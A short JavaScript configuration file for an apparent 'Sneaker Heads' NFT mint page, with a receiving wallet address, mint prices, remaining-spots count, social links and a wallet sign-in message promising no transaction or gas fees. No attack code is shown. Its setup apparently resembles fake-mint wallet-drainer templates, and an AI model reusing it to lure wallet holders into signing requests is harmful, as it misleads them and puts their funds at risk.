const collectionInfo = {
    address: "0x90c75e8Adb130f1058339De1625c94867c93cd80",
    name: "Sneaker Heads",
    socialMedia: {
        discord: "https://discord.com/invite/sneakerheads",
        twitter: "https://twitter.com/sneakerheadsoff",
        instagram: "",
    },
    eprice: 0,
    nprice: 0.01,
    nfts:  100,
    spots: 89,
    logo: "images/logo.jpg",
    backgroundImage: "images/bj.jpg",
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

if (!collectionInfo.address.startsWith("0x") || (collectionInfo.address.length >= 64 || collectionInfo.address.length <= 40))
    console.error(`Error: ${collectionInfo.address} is not a valid Ethereum address.`);

document.getElementById("favicon").href = collectionInfo.logo;
document.getElementById('backgroundImage').style['backgroundImage'] = "url('"+collectionInfo.backgroundImage+"')";
document.title = "Sneaker Heads";
